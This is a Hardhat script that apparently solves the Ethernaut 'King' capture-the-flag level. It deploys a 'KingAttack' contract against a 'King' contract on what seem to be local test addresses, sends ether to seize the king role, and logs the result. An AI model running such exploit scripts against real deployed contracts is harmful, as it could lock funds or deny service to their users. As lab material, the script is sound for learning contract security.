import { ethers } from "hardhat";

const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xCBd5431cC04031d089c90E7c83288183A6Fe545d";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);

//Fit contract name and address (current lvl instance)
const contract = await ethers.getContractAt("King" ,CONTRACT_ADDRESS, signer);
const attackerContractFactory = await ethers.getContractFactory("KingAttack", signer)
const attackerContract =  await attackerContractFactory.deploy(contract.address);

// 1. Check current prize, king address, and my attacker contract address
let prize = await contract.prize()
console.log("Current king(address): ", await contract._king());
console.log("Current price is: ", ethers.utils.formatEther(prize),"eth");
console.log("My attacker contract address is: ", attackerContract.address);

// 2. Call attacker contract function with bigger price as msg.value
await attackerContract.attack({value: ethers.utils.parseEther("0.002")})

// 3. Check again king address and prize after contract call
console.log("Now, king(address) belongs to: ", await contract._king());
prize = await contract.prize();
console.log("Updated prize is: ", ethers.utils.formatEther(prize),"eth" );

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
